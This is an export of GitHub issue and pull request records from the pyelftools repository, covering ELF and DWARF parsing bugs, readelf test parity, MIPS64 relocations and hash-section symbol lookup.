eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/306,590083421,MDU6SXNzdWU1OTAwODM0MjE=,306,How to get variable type,30168324,open,FALSE,NA,NA,6,2020-03-30T08:12:50Z,2020-07-17T18:36:05Z,NA,NONE,NA,"From the demo, I can can global variable addr and size, but not found data type, like unit8 or int32 etc. So how to get type attributes with this lib?
Many thanks!",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/306/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/306/comments,https://api.github.com/repos/eliben/pyelftools/issues/306/events,https://github.com/eliben/pyelftools/issues/306,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/305,587484219,MDExOlB1bGxSZXF1ZXN0MzkzNDE3NzA1,305,tox: sync python versions with travis settings,176950,closed,FALSE,NA,NA,5,2020-03-25T06:58:59Z,2020-08-18T00:57:57Z,2020-08-18T00:57:57Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/305/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/305/comments,https://api.github.com/repos/eliben/pyelftools/issues/305/events,https://github.com/eliben/pyelftools/pull/305,https://api.github.com/repos/eliben/pyelftools/pulls/305
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/304,585759610,MDExOlB1bGxSZXF1ZXN0MzkyMDM0NzM1,304,Support for --debug-dump=loc in readelf.py and in the test,5807738,closed,FALSE,NA,NA,2,2020-03-22T16:38:41Z,2020-03-23T14:29:14Z,2020-03-23T14:16:01Z,CONTRIBUTOR,NA,"The ultimate aim is better testing of the expression dumper.

Some DWARF expressions are not in `.debug_info`, they are in `.debug_loc`. Running `readelf --debug-dump=info` doesn't spell those out, only `readelf --debug-dump=loc` does. This change will make pyelftools' test suite run and compare that option, too.

This doesn't need a dedicated test - running the readelf test on the test files with DWARF in them will pick up this logic automagically.

Location entries of type `BaseAddressEntry` are not supported - we don't have a single test file with those.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/304/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/304/comments,https://api.github.com/repos/eliben/pyelftools/issues/304/events,https://github.com/eliben/pyelftools/pull/304,https://api.github.com/repos/eliben/pyelftools/pulls/304
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/303,583876272,MDExOlB1bGxSZXF1ZXN0MzkwNTU4Nzkz,303,"GNU expressions, take 3",5807738,closed,FALSE,NA,NA,15,2020-03-18T17:06:15Z,2020-03-22T14:40:46Z,2020-03-22T13:35:20Z,CONTRIBUTOR,NA,"No tests so far.

I've produced a body of ELF files with GNU opcodes by compiling `gdb` on Debian Buster x86_64. It generates DWARF by default. I was going to set up a test against readelf, but then ran into #302 - multiple instances of the same attribute. Dear maintainers, please decide what to do about that.

Alternatively, I can publish a standalone unit test - go over a file or two, parse all expressions, make sure all the opcodes parse.

Alternatively, I can make a custom test where I would match the parsed expressions against the output of readelf, ignoring everything else.

EDIT: I've rebuilt GDB with the latest everything, the duplicate attribute issue is no longer there. HOWEVER, now there's an unsupported relocation type.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/303/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/303/comments,https://api.github.com/repos/eliben/pyelftools/issues/303/events,https://github.com/eliben/pyelftools/pull/303,https://api.github.com/repos/eliben/pyelftools/pulls/303
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/302,581888193,MDU6SXNzdWU1ODE4ODgxOTM=,302,Same attribute twice in the DIE,5807738,closed,FALSE,NA,NA,0,2020-03-16T00:17:39Z,2020-03-18T21:59:55Z,2020-03-18T21:59:55Z,CONTRIBUTOR,NA,"Take a look at the abbrev section of  test/testfiles_for_unittests/dwarf_gnuops1.o in master, declaration 272. According to readelf, it goes:

>    272      DW_TAG_subprogram    [no children]
>     DW_AT_external     DW_FORM_flag_present
>     DW_AT_declaration  DW_FORM_flag_present
>     **DW_AT_linkage_name DW_FORM_strp**
>     DW_AT_name         DW_FORM_strp
>     DW_AT_decl_file    DW_FORM_data1
>     DW_AT_decl_line    DW_FORM_data1
>     **DW_AT_linkage_name DW_FORM_strp**
>     DW_AT value: 0     DW_FORM value: 0

`DW_AT_linkage_name` is present twice. Found a couple of DIEs with that declaraion - the value of `linkage_name` is identical in both places.

`Readelf` has no problem with that, pyelftools presumes unique attribute names.

---

The DWARF in the file is v4. This is a violation of the DWARF standard v4 section 2.2:

>No more than one attribute with a given name may appear in any debugging information entry.

There was a similar bug recorded for GCC: https://gcc.gnu.org/legacy-ml/gcc-bugs/2016-10/msg02517.html . So this looks like a compiler bug too. Still, it would break the idea of testing against readelf. I'll see if I can create a bug for GCC.

EDIT: on a later version of Debian, it doesn't reproduce. Guess they've fixed some time in the middle.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/302/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/302/comments,https://api.github.com/repos/eliben/pyelftools/issues/302/events,https://github.com/eliben/pyelftools/issues/302,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/301,581747464,MDU6SXNzdWU1ODE3NDc0NjQ=,301,run_readelf_tests doesn't catch expression parsing mismatches,5807738,closed,FALSE,NA,NA,0,2020-03-15T17:02:51Z,2020-03-15T21:27:36Z,2020-03-15T21:27:36Z,CONTRIBUTOR,NA,"While debugging support for `DW_OP_GNU_entry_value`, I've run the readelf test on my sample file. The test reported a match on `--debug-dump=info`. Meanwhile, the line with the opcode in question goes

`<3a683>   DW_AT_GNU_call_site_value: 3 byte block: f3 1 55 	(DW_OP_GNU_entry_value: (DW_OP_reg5 (rdi)))`

in the proper `readelf` output, and

`<3a683>   DW_AT_GNU_call_site_value: 3 byte block: f3 1 55 	(<unknown DW_OP_GNU_entry_value>)`

in the pyelftools' readelf.py output. The test runner script didn't catch the discrepancy.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/301/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/301/comments,https://api.github.com/repos/eliben/pyelftools/issues/301/events,https://github.com/eliben/pyelftools/issues/301,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/300,581601369,MDExOlB1bGxSZXF1ZXN0Mzg4NjQzNzY0,300,Enhance MIPS64 testing and simplify handling code for its peculiar relocations,758452,closed,FALSE,NA,NA,3,2020-03-15T09:45:07Z,2020-03-17T12:01:46Z,2020-03-17T12:01:46Z,CONTRIBUTOR,NA,"Hello  @eliben @rhelmot,

These commits add simple MIPS64 testcases as suggested in #295. Although these new tests cover the relocation decoding enhancements (#295 and #297), they don’t contain an `.eh_frame` section, and thus cannot reproduce the problem that @rhelmot reported initially in #288.

For the record that I managed to make GCC generate this section using the `-funwind-tables` compilation option… but then pyelftools’s readelf could not load these object files anymore, as our handling of MIPS relocations is incomplete. I see three ways out: 1) either somehow link these object file testcases (to an executable or a shared library, similar to the angr reproducer), but for that I’ll likely need to build a libc for MIPS64, 2) extend pyelftools’ support for MIPS relocations, which look quite involved from a quick glance at the spec, or 3) try to reproduce the original bug (#288) with my system compiler (after all, the bug is not MIPS dependent).

I don’t lose hope. ;-) 3) looks like the easiest approach: I’ll keep you updated. In the meantime, I’m submitting these minimal tests anyway, and also the relocations decoding simplification (feedback welcome on whether you find it useful). Thank you both!",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/300/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/300/comments,https://api.github.com/repos/eliben/pyelftools/issues/300/events,https://github.com/eliben/pyelftools/pull/300,https://api.github.com/repos/eliben/pyelftools/pulls/300
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/299,580606938,MDExOlB1bGxSZXF1ZXN0Mzg3NzgxODk3,299,New expression parsing in dwarf_expr,1130906,closed,FALSE,NA,NA,3,2020-03-13T13:38:46Z,2020-03-14T12:27:11Z,2020-03-14T12:24:53Z,OWNER,NA,"This addresses #298 

Should be simple to extend for nested expressions.

TODOs:

1. Simplify `ExprDumper` in `descriptions` further. Right now it's minimally changed to use the new `parse_expr`.

2. Cache the dispatch table between calls to `parse_expr`. Right now `parse_expr` can be invoked many times for a single section and the dispatch table will be re-created for each call.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/299/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/299/comments,https://api.github.com/repos/eliben/pyelftools/issues/299/events,https://github.com/eliben/pyelftools/pull/299,https://api.github.com/repos/eliben/pyelftools/pulls/299
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/298,580605699,MDU6SXNzdWU1ODA2MDU2OTk=,298,Refactor dwarf_expr parsing,1130906,closed,FALSE,1130906,NA,0,2020-03-13T13:36:31Z,2020-03-14T12:53:19Z,2020-03-14T12:53:19Z,OWNER,NA,"As #284 points out, the current parsing is inflexible and hard to extend for nested expressions.

Refactor the parsing to make it easier to extend. It's OK to change the public API as long as it would be easy to convert to.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/298/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/298/comments,https://api.github.com/repos/eliben/pyelftools/issues/298/events,https://github.com/eliben/pyelftools/issues/298,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/297,579723258,MDExOlB1bGxSZXF1ZXN0Mzg3MDY1MzYx,297,Only byteswap the little endian version of mips64 r_raw_info,2498805,closed,FALSE,NA,NA,3,2020-03-12T06:32:20Z,2020-03-14T12:28:13Z,2020-03-14T12:28:13Z,CONTRIBUTOR,NA,"Followup to #295. It turns out i was not thorough enough with my testing.

The only test file I have for this change is a libc, which is way bigger than any of the binaries currently in the test files archive. But I can confirm it works, and mirrors the way we hacked around this weird ELF edge case in angr before it was supported here.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/297/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/297/comments,https://api.github.com/repos/eliben/pyelftools/issues/297/events,https://github.com/eliben/pyelftools/pull/297,https://api.github.com/repos/eliben/pyelftools/pulls/297
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/296,579510325,MDExOlB1bGxSZXF1ZXN0Mzg2ODkxNDU0,296,.stack_sizes section support,1470960,closed,FALSE,NA,NA,4,2020-03-11T19:54:37Z,2020-07-08T00:07:56Z,2020-07-08T00:07:56Z,NONE,NA,"Just testing the waters here to see if this change is welcome. Added support for dumping the .stack_sizes sections recently added to LLVM. (See https://reviews.llvm.org/D39788). Have locally tested with 32-bit and 64bit ELF files in both endians, but wasn't sure if I should add the ELF and tests (about 8k per file).

Copied the uleb parsing from the DWARF implementations... Should probably refactor them to live elsewhere.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/296/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/296/comments,https://api.github.com/repos/eliben/pyelftools/issues/296/events,https://github.com/eliben/pyelftools/pull/296,https://api.github.com/repos/eliben/pyelftools/pulls/296
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/295,578231014,MDExOlB1bGxSZXF1ZXN0Mzg1ODUxODM1,295,callframe.py: fix DW_EH_PE_absptr decoding,758452,closed,FALSE,2498805,NA,6,2020-03-09T22:40:12Z,2020-03-12T12:19:33Z,2020-03-10T13:12:12Z,CONTRIBUTOR,NA,"Hello,

The second commit fixes the bug uncovered by #288 and includes the reproducer as a new testcase, and the first commit extends relocations parsing to handle the special ELF64 MIPS format… so that the second commit’s test works properly.

Thanks,",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/295/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/295/comments,https://api.github.com/repos/eliben/pyelftools/issues/295/events,https://github.com/eliben/pyelftools/pull/295,https://api.github.com/repos/eliben/pyelftools/pulls/295
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/294,578227844,MDExOlB1bGxSZXF1ZXN0Mzg1ODQ5MTYz,294,readelf.py: minor enhancements for debugging,758452,closed,FALSE,NA,NA,0,2020-03-09T22:31:21Z,2020-03-10T12:46:47Z,2020-03-10T12:46:46Z,CONTRIBUTOR,NA,"Hello,

Here are a couple of small enhancements to the readelf.py script to ease debugging: make sure the script output is consistent on error, and add an option to display the traceback (can help to quickly locate the error). I hope these will make the life of developpers easier. :-)

Thanks,",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/294/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/294/comments,https://api.github.com/repos/eliben/pyelftools/issues/294/events,https://github.com/eliben/pyelftools/pull/294,https://api.github.com/repos/eliben/pyelftools/pulls/294
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/293,577796616,MDExOlB1bGxSZXF1ZXN0Mzg1NDk2NDU0,293,Minor enhancements for readelf-based tests,758452,closed,FALSE,NA,NA,0,2020-03-09T10:17:35Z,2020-03-09T12:36:56Z,2020-03-09T12:36:56Z,CONTRIBUTOR,NA,"Hello,

This is a first batch of small enhancements (ELF constants, enums and `describe_*` functions) required in order to add the reproducer for #288 to the readelf testcases.

No test comes with these patches since some issues remain: for now, `readelf.py -r` crashes, I still have to investigate why. Given that the changes are relatively straightforward, I hope it’s fine. Please let me know, thanks!",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/293/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/293/comments,https://api.github.com/repos/eliben/pyelftools/issues/293/events,https://github.com/eliben/pyelftools/pull/293,https://api.github.com/repos/eliben/pyelftools/pulls/293
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/292,577340619,MDExOlB1bGxSZXF1ZXN0Mzg1MTQ4ODM5,292,readelf: print addend for RELA relocations without symbol,6428272,closed,FALSE,NA,NA,1,2020-03-07T14:16:25Z,2020-10-02T07:53:18Z,2020-03-07T14:32:41Z,CONTRIBUTOR,NA,"When processing relocations from a SHT_RELA type section, GNU readelf displays the value of the 'r_addend' field if no symbol index is given (that is, 'r_info_sym' is 0).

By also implementing this we can better test the output for 64-bit binaries which commonly use SHT_RELA relocations.

The included test file is the same as tls.elf but compiled for x86_64. Its code is the following:

```C
  __thread int i;

  int main(){}
```

and it is compiled using the following command line:

```
$ gcc -m64 -o tls64.elf tls.c
```",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/292/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/292/comments,https://api.github.com/repos/eliben/pyelftools/issues/292/events,https://github.com/eliben/pyelftools/pull/292,https://api.github.com/repos/eliben/pyelftools/pulls/292
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/291,573903822,MDExOlB1bGxSZXF1ZXN0MzgyMzI1MTYw,291,construct_utils.py: add missing import,6428272,closed,FALSE,NA,NA,0,2020-03-02T11:16:32Z,2020-10-02T07:53:24Z,2020-03-06T14:00:28Z,CONTRIBUTOR,NA,"Add a forgotten import of SizeofError.

Fixes: #278",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/291/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/291/comments,https://api.github.com/repos/eliben/pyelftools/issues/291/events,https://github.com/eliben/pyelftools/pull/291,https://api.github.com/repos/eliben/pyelftools/pulls/291
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/290,566270660,MDExOlB1bGxSZXF1ZXN0Mzc2MTEzMDQ4,290,"{GNU,}HashSection: Implement symbol lookup",6428272,closed,FALSE,NA,NA,4,2020-02-17T12:34:36Z,2020-10-02T07:52:52Z,2020-03-09T12:39:24Z,CONTRIBUTOR,NA,"In super-stripped binaries, symbol tables can not be accessed directly as we do not have section headers to find them. In this case, we can already use the mandatory DynamicSegment which provides methods for individual access and iteration over symbols via a minimal implementation of symbol hash sections which only provided the number of symbols so far.

As we can also directly look up symbols via the hash table, let's implement this functionality as well.

The code is based on @rhelmot's implementation as discussed in #219, with some changes around reading the hash parameters.

For supporting individual symbol lookup, we also need the corresponding symbol table to get the Symbol objects if the matching hash was found in the hash section. In regular ELF files, the symbol table is denoted by the section index provided in the sh_link field of the hash section and automatically created when building the hash section, for super-stripped binaries we can use the DynamicSegment (which needs to be present in any case) as the symbol table as it also provides a get_symbol() method relying on other ways to determine the list of symbols. Both of these variants can be seen in the improved test_hash.py file.

The hash tables are implemented in a base class which does not derive from the Section class in order to allow instantiation even if no section headers are present in the underlying file.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/290/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/290/comments,https://api.github.com/repos/eliben/pyelftools/issues/290/events,https://github.com/eliben/pyelftools/pull/290,https://api.github.com/repos/eliben/pyelftools/pulls/290
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/289,566258554,MDExOlB1bGxSZXF1ZXN0Mzc2MTA0MTY1,289,readelf.py: adapt section mapping output for .tbss sections,6428272,closed,FALSE,NA,NA,2,2020-02-17T12:12:32Z,2020-10-02T07:53:22Z,2020-03-07T14:05:43Z,CONTRIBUTOR,NA,"GNU readelf does not show the .tbss section as part of the loaded data segment when listing the section to segment mappings, using the ELF_TBSS_SPECIAL macro in include/elf/internal.h to skip printing the section name.

From `include/elf/internal.h` [[0]]: 
```C
/* .tbss is special.  It doesn't contribute memory space to normal
   segments and it doesn't take file space in normal segments.  */
#define ELF_TBSS_SPECIAL(sec_hdr, segment)			\
  (((sec_hdr)->sh_flags & SHF_TLS) != 0				\
   && (sec_hdr)->sh_type == SHT_NOBITS				\
   && (segment)->p_type != PT_TLS)
```
and `binutils/readelf.c` [[1]]:
```C
  for (j = 1; j < filedata->file_header.e_shnum; j++, section++)
    {
      if (!ELF_TBSS_SPECIAL (section, segment)
	  && ELF_SECTION_IN_SEGMENT_STRICT (section, segment))
	printf (""%s "", printable_section_name (filedata, section));
    }

```
Implement the same logic in readelf.py. 

This is related to #275 where Segment.section_in_segment() was fixed for SHF_TLS-flagged sections.

[0]: https://github.com/bminor/binutils-gdb/blob/be70ff166e683fea2d78097d378020a8d3259189/include/elf/internal.h#L305
[1]: https://github.com/bminor/binutils-gdb/blob/be70ff166e683fea2d78097d378020a8d3259189/binutils/readelf.c#L5389",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/289/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/289/comments,https://api.github.com/repos/eliben/pyelftools/issues/289/events,https://github.com/eliben/pyelftools/pull/289,https://api.github.com/repos/eliben/pyelftools/pulls/289
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/288,565702930,MDU6SXNzdWU1NjU3MDI5MzA=,288,off-by-one parsing eh_frame,2498805,closed,FALSE,NA,NA,2,2020-02-15T05:59:02Z,2020-03-10T13:12:14Z,2020-03-10T13:12:14Z,CONTRIBUTOR,NA,"When enumerating `elffile.get_dwarf_info().EH_CFI_entries()` for 
[this file](https://github.com/eliben/pyelftools/files/4207796/in.acng.gz), the following error occurs:

```
apt-cacher-ng_2-2_mips64el.deb.data/usr/lib/apt-cacher-ng/in.acng
Traceback (most recent call last):
  File ""/home/audrey/angr/pyelftools/elftools/construct/core.py"", line 351, in _parse
    return self.packer.unpack(_read_stream(stream, self.length))[0]
  File ""/home/audrey/angr/pyelftools/elftools/construct/core.py"", line 293, in _read_stream
    raise FieldError(""expected %d, found %d"" % (length, len(data)))
elftools.construct.core.FieldError: expected 4, found 3

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""/home/audrey/angr/pyelftools/elftools/common/utils.py"", line 40, in struct_parse
    return struct.parse_stream(stream)
  File ""/home/audrey/angr/pyelftools/elftools/construct/core.py"", line 190, in parse_stream
    return self._parse(stream, Container())
  File ""/home/audrey/angr/pyelftools/elftools/construct/core.py"", line 353, in _parse
    raise FieldError(ex)
elftools.construct.core.FieldError: expected 4, found 3

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""./try_load.py"", line 14, in <module>
    angr.Project(filename, auto_load_libs=False)
  File ""/home/audrey/angr/angr/angr/project.py"", line 129, in __init__
    self.loader = cle.Loader(self.filename, concrete_target=concrete_target, **load_options)
  File ""/home/audrey/angr/cle/cle/loader.py"", line 134, in __init__
    self.initial_load_objects = self._internal_load(main_binary, *preload_libs, *force_load_libs, preloading=(main_binary, *preload_libs))
  File ""/home/audrey/angr/cle/cle/loader.py"", line 655, in _internal_load
    obj = self._load_object_isolated(main_spec)
  File ""/home/audrey/angr/cle/cle/loader.py"", line 813, in _load_object_isolated
    return backend_cls(full_spec, is_main_bin=self.main_object is None, loader=self, **options)
  File ""/home/audrey/angr/cle/cle/backends/elf/elf.py"", line 146, in __init__
    self._load_function_hints_from_fde(dwarf)
  File ""/home/audrey/angr/cle/cle/backends/elf/elf.py"", line 446, in _load_function_hints_from_fde
    for entry in dwarf.EH_CFI_entries():
  File ""/home/audrey/angr/pyelftools/elftools/dwarf/dwarfinfo.py"", line 191, in EH_CFI_entries
    return cfi.get_entries()
  File ""/home/audrey/angr/pyelftools/elftools/dwarf/callframe.py"", line 71, in get_entries
    self.entries = self._parse_entries()
  File ""/home/audrey/angr/pyelftools/elftools/dwarf/callframe.py"", line 80, in _parse_entries
    entries.append(self._parse_entry_at(offset))
  File ""/home/audrey/angr/pyelftools/elftools/dwarf/callframe.py"", line 93, in _parse_entry_at
    self.base_structs.Dwarf_uint32(''), self.stream, offset)
  File ""/home/audrey/angr/pyelftools/elftools/common/utils.py"", line 42, in struct_parse
    raise ELFParseError(str(e))
elftools.common.exceptions.ELFParseError: expected 4, found 3
```

when I try to go in and debug the issue, I find that at the time of the crash, the stream points to offset 0x1e1 in the section, and `readelf --debug-dump=frames` shows:

```
<...snip>

00000188 0000000000000054 00000024 FDE cie=00000168 pc=0000000000001100..0000000000001848
  Augmentation data:     08 00 02 00 00 00 00 00
  DW_CFA_advance_loc: 4 to 0000000000001104
  DW_CFA_def_cfa_offset: 1984
  DW_CFA_advance_loc: 4 to 0000000000001108
  DW_CFA_offset: r28 at cfa-24
  DW_CFA_advance_loc: 16 to 0000000000001118
  DW_CFA_offset: r16 at cfa-88
  DW_CFA_advance_loc: 20 to 000000000000112c
  DW_CFA_offset: r18 at cfa-72
  DW_CFA_offset: r17 at cfa-80
  DW_CFA_advance_loc: 44 to 0000000000001158
  DW_CFA_offset: r31 at cfa-8
  DW_CFA_offset: r20 at cfa-56
  DW_CFA_offset: r19 at cfa-64
  DW_CFA_offset: r30 at cfa-16
  DW_CFA_offset: r23 at cfa-32
  DW_CFA_offset: r22 at cfa-40
  DW_CFA_offset: r21 at cfa-48
  DW_CFA_advance_loc2: 264 to 0000000000001260
  DW_CFA_remember_state
  DW_CFA_def_cfa_offset: 0
  DW_CFA_restore: r16
  DW_CFA_restore: r17
  DW_CFA_restore: r18
  DW_CFA_restore: r19
  DW_CFA_restore: r20
  DW_CFA_restore: r21
  DW_CFA_restore: r22
  DW_CFA_restore: r23
  DW_CFA_restore: r28
  DW_CFA_restore: r30
  DW_CFA_restore: r31
  DW_CFA_restore_state
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop

000001e0 ZERO terminator
```

So the parser got off-by-one at some point and now can't read the EOF marker. I verified that it correctly starts parsing an entity at 0x188, and reads an even amount for the augmentation data length, but after reading the augmentation data length the stream is seeked to an odd offset, such that the odd offset + the read length == 0x1e0. I suspect that this is because `CallFrameInfo._read_augmentation_data`'s use of a uleb128 to unpack the length is incorrect, but I have so little insight into how this stuff is supposed to work that I can't think of where to check that.

I can tell that when `end_offset` is computed in `_parse_entry_at`, that value _is_ correct, 0x1e0. Should there be an assertion there that it's equal to `self.stream.tell()`?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/288/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/288/comments,https://api.github.com/repos/eliben/pyelftools/issues/288/events,https://github.com/eliben/pyelftools/issues/288,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/287,565637206,MDExOlB1bGxSZXF1ZXN0Mzc1NjQxNjYx,287,Add resilience for degenerate cases present in files with only debug information,2498805,closed,FALSE,NA,NA,7,2020-02-15T01:29:56Z,2020-03-07T13:39:14Z,2020-03-07T13:39:13Z,CONTRIBUTOR,NA,"Some ELF files which contain only debug symbols have important sections present in the section table but marked as NOBITS instead of PROGBITS. Attempting to extract the segments can lead to crashes through parsing invalid data.

The first patch modifies the dynamic segment/section specifically to add a flag for this case, since it seems to assume that there will always be at least one entry, DT_NULL.

The second patch modifies the segment code more generally to return a dummy answer for what data it holds. The actual way that this change prevents a crash is while trying to parse `.eh_frame` when it is in fact NOBITS - originally I had a more targeted patch, but decided that it was important enough to do more generally:

```diff
@@ -586,7 +586,10 @@ class ELFFile(object):
         """"""
         # The section data is read into a new stream, for processing
         section_stream = BytesIO()
-        section_stream.write(section.data())
+        if section.header['sh_type'] == 'SHT_NOBITS':
+            section_stream.write(b'\0'*section.data_size)
+        else:
+            section_stream.write(section.data())

         if relocate_dwarf_sections:
             reloc_handler = RelocationHandler(self)
```

The file that triggers the issues for both of these commits can be found in the debian archives:

```
### Package: http://cdn-fastly.deb.debian.org/debian/pool/main/g/gst-python1.0/python3-gst-1.0-dbg_1.10.4-1_armel.deb
### Binary: ./usr/lib/debug/.build-id/d5/7160bd85084057a4749016613857a979681eb7.debug
```",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/287/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/287/comments,https://api.github.com/repos/eliben/pyelftools/issues/287/events,https://github.com/eliben/pyelftools/pull/287,https://api.github.com/repos/eliben/pyelftools/pulls/287
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/286,561931520,MDU6SXNzdWU1NjE5MzE1MjA=,286,Why aren't DW_FORM_blockX attributes returned as bytes?,5807738,open,FALSE,NA,NA,2,2020-02-08T00:01:35Z,2020-08-31T18:42:11Z,NA,CONTRIBUTOR,NA,Those come across as lists of ints.,NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/286/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/286/comments,https://api.github.com/repos/eliben/pyelftools/issues/286/events,https://github.com/eliben/pyelftools/issues/286,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/285,561739307,MDExOlB1bGxSZXF1ZXN0MzcyNDkzNTkw,285,examples: Add dwarf_lineprogram_filenames.py,3059210,closed,FALSE,NA,NA,1,2020-02-07T16:23:43Z,2020-03-07T13:24:44Z,2020-03-07T13:24:43Z,CONTRIBUTOR,NA,"This adds an example of the operation discussed in #283.

Usage:

```bash
python3 ./dwarf_lineprogram_filenames.py --test x.elf y.elf z.elf
```

cc @mdmillerii",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/285/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/285/comments,https://api.github.com/repos/eliben/pyelftools/issues/285/events,https://github.com/eliben/pyelftools/pull/285,https://api.github.com/repos/eliben/pyelftools/pulls/285
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/284,561672169,MDExOlB1bGxSZXF1ZXN0MzcyNDQwMjA4,284,GNU expressions,5807738,closed,FALSE,1130906,NA,13,2020-02-07T14:31:34Z,2020-03-22T17:02:03Z,2020-03-13T19:05:35Z,CONTRIBUTOR,NA,"Support for some GNU opcodes for DWARF expressions.

One of them, `DW_OP_GNU_entry_value`, threw a monkey wrench into the whole expression parsing scheme. As an argument, it contains a variable length binary blob **with another expression**. So the expression parsing logic should recurse. Now, expression parsing in pyelftools was originally designed with progressive parsing in mind, thus the visitor logic. There is no out out the box logic for ""parse this expression into a single data structure"".

So I came up with one. In order to keep things compatible, I've split the `ExprDumper` class from `descriptions.py` into two parts - the ""unite operations into a list"" bit and the ""format an operation into a string"" bit. The former resides under `dwarf_expr` now, as `GenericExprDumper`, and the parsing logic of `DW_OP_GNU_entry_value` relies on that to combine the nested expression into a list.

There's a unit test, too.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/284/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/284/comments,https://api.github.com/repos/eliben/pyelftools/issues/284/events,https://github.com/eliben/pyelftools/pull/284,https://api.github.com/repos/eliben/pyelftools/pulls/284
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/283,561327650,MDU6SXNzdWU1NjEzMjc2NTA=,283,Proposal: An API for getting the filename of line-program entry members,3059210,closed,FALSE,NA,NA,7,2020-02-06T23:19:38Z,2020-02-07T15:00:30Z,2020-02-07T14:37:54Z,CONTRIBUTOR,NA,"Getting the filename associated with a line-program entry member is currently a little tedious:

1. Grab the file index (`lpe.state.file`)
2. Look up the file entry in the line program header
3. Look up the directory index in the file entry
4. Join the resolved directory to the basename in the file entry

This could be provided with relatively few changes on the `LineProgram` class, like so:

```python
lp = LineProgram(...)
